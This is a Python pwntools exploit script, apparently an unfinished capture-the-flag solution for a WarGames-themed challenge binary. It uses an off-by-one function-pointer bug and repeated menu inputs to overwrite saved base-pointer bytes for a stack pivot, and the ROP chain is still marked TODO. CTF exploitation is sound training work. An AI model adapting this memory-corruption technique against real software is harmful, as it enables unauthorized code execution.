#!/usr/bin/env python2

"""
Off-by-one error when calling the fptr for global thermonuclear war. It uses
functions[8] as the fptr when functions is only 8 pointers long. functions[8]
is intro[0], however we can't get a valid fptr here without another exploit.
"""

from elements import ELEMENTS
from pwn import *

#conn = remote("challenge.acictf.com", 31803)
conn = process("./ropen_to_suggestions")
#gdb.attach(conn, "b *0x4700002b3a \n b *0x4700002c03 \n c")

#context.log_level = "debug"


def add_element(elem):
    conn.sendline("0")
    conn.recvuntil("add?\n")
    conn.sendline(elem)
    data = conn.recvuntil("Main Menu\n")
    assert "INVALID" not in data


def overflow_rbp():
    conn.sendline("8")  # chemical
    conn.recvuntil("Main Menu\n")
    for elem in ELEMENTS:
        for _ in xrange(10):
            add_element(str(elem))

    log.info("Incrementing 20 elements to 1000")

    i = 0
    for elem in ELEMENTS:
        for _ in xrange(90):
            add_element(str(elem))

        i += 1
        if i > 69:
            break

    log.info("Incrementing Oganesson to 1000")
    for _ in xrange(990):
        add_element("Oganesson")


    gdb.attach(conn, "b *0x4700002b3a \n b *0x4700002c03 \n c")

    # Overflow EBP low bytes
    conn.sendline("2")

    # TODO Write rop chain to buf


    # Ret twice to trigger stack pivot and ROP
    conn.sendline("4")
    #conn.sendline(" # todo - return again to trigger EBP
    conn.interactive()


def main():
    conn.recvuntil("FALKEN.\n")
    conn.sendline("")
    conn.recvuntil("TODAY?\n")
    conn.sendline("")
    conn.recvuntil("1973.\n")
    conn.sendline("PEOPLE SOMETIMES MAKE MISTAKES")
    conn.recvuntil("GLOBAL THERMONUCLEAR WAR\n")

    overflow_rbp()
    #conn.interactive()


if __name__ == "__main__":
    main()
